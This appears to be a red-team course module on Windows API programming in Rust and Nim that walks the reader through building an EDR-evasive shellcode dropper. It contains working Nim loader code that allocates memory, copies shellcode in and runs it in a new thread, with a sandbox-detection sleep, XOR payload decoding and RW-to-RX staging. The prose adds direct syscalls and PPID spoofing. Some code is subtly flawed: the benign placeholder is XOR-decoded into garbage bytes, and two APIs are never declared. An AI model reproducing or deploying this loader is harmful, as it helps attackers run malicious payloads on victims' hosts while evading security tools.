steps.heading: Windows API From Rust
steps.body:
The Windows API is a collection of C functions exported from DLLs — kernel32.dll, ntdll.dll, advapi32.dll, and hundreds more. Every high-level Windows operation ultimately calls one of these. Process creation, memory allocation, thread injection, registry manipulation — all of it is exposed as C function calls. From Rust, you reach these through FFI: declare the function signature in an extern "system" block (Windows uses the stdcall calling convention, not C's cdecl), link the DLL, and call from unsafe.

The windows-sys crate wraps this entire surface. It generates the correct extern blocks, type definitions, and constants from Microsoft's official metadata. Using it means you don't have to hand-transcribe HANDLE, DWORD, and LPVOID type definitions — but you do need to understand what those types map to in Rust (most are aliases for usize, u32, or *mut c_void) and why.

For red team tooling, Windows API fluency is non-negotiable. Process injection, privilege escalation, credential access, persistence — every technique in the ATT&CK matrix has a Windows API call at its core. Rust's zero-cost FFI means your tooling has no interpreter overhead and compiles to a standalone binary with no runtime dependencies.

steps.heading: Handles, Types & Calling Convention
steps.body:
Windows API types follow a consistent pattern: HANDLE is an opaque pointer to a kernel object (process, thread, file, registry key). DWORD is an unsigned 32-bit integer. BOOL is an i32 that returns 0 for failure and non-zero for success — it is NOT a Rust bool. LPVOID is *mut c_void — a raw void pointer. LPCSTR and LPCWSTR are pointers to null-terminated ASCII and UTF-16 strings respectively.

The calling convention matters. Windows 32-bit API uses stdcall: the callee cleans the stack. Windows 64-bit API uses the Microsoft x64 calling convention (fastcall variant): first four arguments in RCX, RDX, R8, R9; rest on stack; callee does NOT clean. In Rust FFI, extern "system" uses stdcall on 32-bit and the correct 64-bit convention on 64-bit — use it for all Windows API calls.

Error handling on Windows: most API functions return a BOOL or HANDLE. On failure, BOOL returns 0 and HANDLE returns INVALID_HANDLE_VALUE (which is -1 cast to usize, i.e. 0xFFFFFFFFFFFFFFFF on 64-bit). After any failure, call GetLastError() to retrieve the error code. Always check return values. A VirtualAllocEx that returns null silently will cause a null pointer dereference on the very next line.

steps.heading: OPSEC, EDR Hooks & Syscalls
steps.body:
Every Windows API call you make goes through ntdll.dll before reaching the kernel. EDR products hook ntdll — they overwrite the first bytes of sensitive functions like NtAllocateVirtualMemory with a JMP to their own analysis code. Your call gets inspected, logged, and potentially blocked before it ever reaches the kernel. This is userland hooking.

The evasion technique is direct syscalls: bypass ntdll entirely and invoke the kernel transition (syscall instruction on x64) directly with the correct syscall number (SSN). Syscall numbers change between Windows versions, so a hardcoded SSN is fragile — tools like SysWhispers3 resolve them at runtime by reading the SSN from the actual ntdll on disk (which is unhooked, since the hooked version is only in memory).

From Rust, direct syscalls require inline assembly (std::arch::asm!) or a compiled ASM stub linked in. This is advanced territory — but understanding the mechanism tells you why EDR behavioral alerts fire on OpenProcess + VirtualAllocEx + WriteProcessMemory in sequence: that exact call chain is the classic injection triad and every EDR on the market watches for it. Changing the call order, splitting across threads, or using alternative APIs (NtMapViewOfSection instead of WriteProcessMemory) changes the behavioral signature.

steps.heading: Nim: Fast, Strange, Effective
steps.body:
Nim is a statically typed, compiled language that transpiles to C (or C++, or JavaScript) before producing a binary. That transpilation step is exactly why the offensive security community adopted it: the resulting binary looks like a C program to static analysis tools that fingerprint compiler artifacts, Nim's FFI to C and Windows APIs is trivial, and the language is high-level enough to write complex tooling quickly.

Nim compiles to a standalone executable with no runtime interpreter requirement. It has a garbage collector (the default is a deferred reference counting GC, but you can select arc, orc, or none). For shellcode injection where you want no GC pauses, --gc:none with manual memory management is the correct choice. The binary size is small by default, further reducing the profile compared to Go binaries.

The offensive use case is specific: write the loader logic in Nim's clean syntax, call Windows APIs directly through Nim's importc pragma, and let the C backend handle the ABI details. Shellcode injection in 30 lines of Nim is realistic. Understanding why this works — at the transpilation and API level — is what this module builds.

steps.heading: Nim FFI: importc and winapi
steps.body:
Nim's foreign function interface uses pragmas — compiler annotations — to declare external C or Windows API functions. The importc pragma tells the Nim compiler that this function is implemented in C and should be called by the given name. The dynlib pragma specifies which DLL to load it from. The stdcall pragma sets the calling convention for Windows API calls.

Type mapping from Windows API to Nim: HANDLE maps to pointer (or int) in Nim — it's an opaque value. DWORD maps to DWORD which Nim defines as uint32. LPVOID maps to pointer. BOOL maps to WINBOOL (int32 in Nim). SIZE_T maps to int. Nim's ptr type is a garbage-collected traced pointer; pointer is an untraced raw pointer equivalent to void* in C — use pointer for Windows API interop, never ptr.

The winim library wraps the entire Windows API surface for Nim, similar to windows-sys for Rust. For educational purposes this module uses raw importc declarations so you see exactly what's happening at the ABI boundary. In production tooling, winim saves time and reduces declaration errors.

steps.heading: Windows API Declarations in Nim
steps.body: The foundational importc declarations for the classic shellcode injection API surface — VirtualAlloc, RtlMoveMemory, CreateThread — with correct types and calling conventions.
steps.code:
# Nim shellcode injection — Windows API declarations via importc
# Compile: nim c --gc:none -d:release -d:strip --opt:size loader.nim

type
  HANDLE   = int           # Opaque kernel object handle
  LPVOID   = pointer       # void* — raw untraced pointer
  DWORD    = uint32
  SIZE_T   = int
  WINBOOL  = int32

# VirtualAlloc: allocate memory in THIS process's address space
proc VirtualAlloc(
  lpAddress:        LPVOID,
  dwSize:           SIZE_T,
  flAllocationType: DWORD,
  flProtect:        DWORD
): LPVOID
  {.importc: "VirtualAlloc", dynlib: "kernel32", stdcall.}

# RtlMoveMemory: copy bytes from source to destination (like memmove)
proc RtlMoveMemory(
  dest:   LPVOID,
  source: LPVOID,
  length: SIZE_T
): void
  {.importc: "RtlMoveMemory", dynlib: "ntdll", stdcall.}

# CreateThread: create a new thread in the current process
proc CreateThread(
  lpThreadAttributes: LPVOID,
  dwStackSize:        SIZE_T,
  lpStartAddress:     LPVOID,  # Thread start address — where execution begins
  lpParameter:        LPVOID,
  dwCreationFlags:    DWORD,
  lpThreadId:         ptr DWORD
): HANDLE
  {.importc: "CreateThread", dynlib: "kernel32", stdcall.}

# WaitForSingleObject: block until a kernel object is signaled (thread exits)
proc WaitForSingleObject(
  hHandle:        HANDLE,
  dwMilliseconds: DWORD
): DWORD
  {.importc: "WaitForSingleObject", dynlib: "kernel32", stdcall.}

steps.heading: Shellcode Allocation and Execution
steps.body: The complete injection sequence using the declared APIs: allocate RWX memory, copy shellcode in, create a thread at the shellcode address, and wait for it to finish. This is classic local shellcode execution — no remote process involved.
steps.code:
# Shellcode: 64-bit Windows x64 calc.exe shellcode (truncated for illustration)
# In a real loader this would be XOR-encoded and decoded at runtime
var shellcode: array[276, byte] = [
  byte 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00,
  byte 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
  # ... remaining bytes omitted for length — full shellcode would be 276 bytes
  byte 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
]

const
  MEM_COMMIT             = 0x00001000'u32
  MEM_RESERVE            = 0x00002000'u32
  PAGE_EXECUTE_READWRITE = 0x40'u32
  INFINITE               = 0xFFFFFFFF'u32

proc injectLocal() =
  # Step 1: Allocate RWX memory — size matches shellcode byte count exactly
  let mem = VirtualAlloc(
    nil,                              # Let OS choose address
    shellcode.len,                    # Exact shellcode size in bytes
    MEM_COMMIT or MEM_RESERVE,        # Nim uses 'or' for bitwise OR, not '|'
    PAGE_EXECUTE_READWRITE            # Must be executable for shellcode
  )
  if mem == nil:
    echo "[-] VirtualAlloc failed"
    return

  # Step 2: Copy shellcode bytes into allocated RWX region
  RtlMoveMemory(
    mem,                              # Destination: the RWX allocation
    shellcode[0].addr,                # Source: address of first byte of array
    shellcode.len                     # Length: byte count
  )

  # Step 3: Create a thread starting at the shellcode address
  var tid: DWORD
  let hThread = CreateThread(nil, 0, mem, nil, 0, tid.addr)
  if hThread == 0:
    echo "[-] CreateThread failed"
    return

  # Step 4: Wait for shellcode thread to finish before exiting
  discard WaitForSingleObject(hThread, INFINITE)  # discard: ignore return value
  echo "[+] Shellcode thread completed"

injectLocal()

steps.heading: Detection Vectors & Evasion Techniques
steps.body:
The three detection vectors for Nim shellcode loaders are static signatures, behavioral analytics, and memory scanning. Static signatures match known byte patterns in the binary — Nim's standard library leaves recognizable strings in the binary (GC initialization routines, module names). Compile with --gc:none -d:strip --opt:size to minimize these artifacts.

Behavioral analytics watch the API call sequence. VirtualAlloc with PAGE_EXECUTE_READWRITE followed immediately by CreateThread is the highest-confidence injection signature in existence. Every EDR fires on this. The standard evasion: allocate with PAGE_READWRITE, copy shellcode, then call VirtualProtect to change to PAGE_EXECUTE_READ before creating the thread. This changes the observable permission sequence from a single RWX allocation to a two-step RW→RX transition, which has a lower signature match confidence.

Memory scanning by EDR products scans executable memory regions for shellcode signatures — NOP sleds, known shellcode preambles, function hashes. XOR-encode the shellcode with a runtime-generated key, decode in memory immediately before execution, and the in-memory bytes are different from the known signature. The decode loop itself must be short and generic enough not to become its own signature.

steps.heading: What an EDR-Evasive Dropper Is
steps.body:
A dropper's job is to get shellcode executing on a target host without being stopped. An EDR-evasive dropper does this while avoiding detection by endpoint security software. This is not about being undetectable forever — it's about being undetected during the execution window. Every technique in this module has a corresponding detection that blue teams can build; the point is to understand both sides.

The dropper you're building uses four layered evasion techniques: XOR-encoded shellcode payload (defeats static signature matching on the payload bytes), RW→RX memory permission staging (avoids the single RWX allocation behavioral signature), sleep-based sandbox evasion (automated analysis sandboxes have short timeouts), and PPID spoofing via process attribute lists (parent process ID manipulation to make the spawned process appear to come from a legitimate parent).

Each technique addresses a different detection layer: static AV, behavioral EDR hooks, dynamic sandbox analysis, and process genealogy heuristics. Combining them compounds the evasion effectiveness. Understanding the layers is what separates a tool built on cargo-culted snippets from one you can debug, adapt, and extend when a new EDR update catches a specific technique.

steps.heading: PPID Spoofing & Process Attributes
steps.body:
Windows process creation via CreateProcess accepts a STARTUPINFOEX structure that includes a LPPROC_THREAD_ATTRIBUTE_LIST. One of the supported attributes is PROC_THREAD_ATTRIBUTE_PARENT_PROCESS — set this to a handle of any process, and the newly created process reports that process as its parent in Task Manager, Process Monitor, and EDR telemetry.

Why does this matter? EDR products build process trees and apply behavioral rules based on parent-child relationships. cmd.exe spawned by winword.exe is extremely suspicious (macro execution). cmd.exe spawned by explorer.exe is normal. PPID spoofing makes your injected process appear to come from explorer.exe regardless of which process actually created it.

The Nim implementation: OpenProcess the spoofing target (e.g. explorer.exe by PID), call InitializeProcThreadAttributeList to allocate an attribute list, UpdateProcThreadAttribute to set PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to the explorer handle, populate a STARTUPINFOEX with the attribute list, and pass it to CreateProcess with EXTENDED_STARTUPINFO_PRESENT in the creation flags. Clean up the attribute list and handle after process creation.

steps.heading: Sandbox Evasion & RW-to-RX Staging
steps.body: The sleep-based sandbox check and the two-step RW→RX memory staging — the first two evasion layers combined into the loader's core execution function.
steps.code:
import std/times

proc sandboxCheck(): bool =
  ## Sleep 10 seconds; if actual elapsed time is much less, we're in an accelerated sandbox
  let before = epochTime()            # Wall clock time before sleep
  Sleep(10_000)                       # 10 000 ms = 10 seconds
  let elapsed = epochTime() - before
  if elapsed < 8.0:                   # Sandbox sped up time — less than 8s elapsed
    return false                      # Bail out
  return true

var shellcode: array[8, byte] = [     # Placeholder: replace with real XOR-encoded payload
  byte 0x90, 0x90, 0x90, 0x90,       # NOP sled
  byte 0x90, 0x90, 0x90, 0xC3        # ...ret — benign stub for testing
]

proc decodePayload(key: byte) =
  ## XOR-decode shellcode in-place before allocation
  for i in 0 ..< shellcode.len:
    shellcode[i] = shellcode[i] xor key

proc loadAndExecute() =
  if not sandboxCheck():
    echo "[-] Sandbox detected — exiting"
    return

  decodePayload(0xAB)                 # Decode with hardcoded key — runtime only

  # Stage 1: Allocate RW memory — NO execute permission yet
  let mem = VirtualAlloc(nil, shellcode.len,
                         MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return

  # Stage 2: Copy decoded shellcode into RW allocation
  RtlMoveMemory(mem, shellcode[0].addr, shellcode.len)

  # Stage 3: Flip permissions RW -> RX — now executable, no longer writable
  var oldProt: DWORD
  discard VirtualProtect(mem, shellcode.len, PAGE_EXECUTE_READ, oldProt.addr)

  # Stage 4: Execute in a new thread
  var tid: DWORD
  let hThread = CreateThread(nil, 0, mem, nil, 0, tid.addr)
  if hThread != 0:
    discard WaitForSingleObject(hThread, INFINITE)

loadAndExecute()

steps.heading: Putting It Together: Layered Evasion
steps.body:
The complete dropper chains four independent evasion techniques. Each layer is independently bypassed by different defensive tools; combining them forces the defender to have all four detections working simultaneously.

Layer 1 — Payload encoding: the shellcode bytes on disk and in the source file are XOR-encoded. Static AV signature engines see no known shellcode pattern. The decode operation happens in memory milliseconds before execution. The key can be hardcoded (weak, eventually signatured) or derived at runtime from environmental conditions (hostname hash, time-based value) for polymorphism.

Layer 2 — Permission staging: RW allocation followed by VirtualProtect to RX avoids the single-allocation RWX pattern. Behavioral engines watching for VirtualAlloc(PAGE_EXECUTE_READWRITE) will not fire. The VirtualProtect transition is detectable but has lower signature confidence.

Layer 3 — Sleep-based sandbox evasion: automated sandboxes have execution time limits (typically 2-3 minutes). A 10-second sleep with clock-drift verification causes the dropper to behave benignly in a sandbox and execute maliciously on a real host. Sandboxes that skip sleep calls expose themselves through the elapsed time check.

Layer 4 — PPID spoofing: the spawned thread or process inherits telemetry from a legitimate parent. Process genealogy heuristics that fire on 'unusual parent' are bypassed. This is most effective when spawning a new process rather than injecting into the current one.
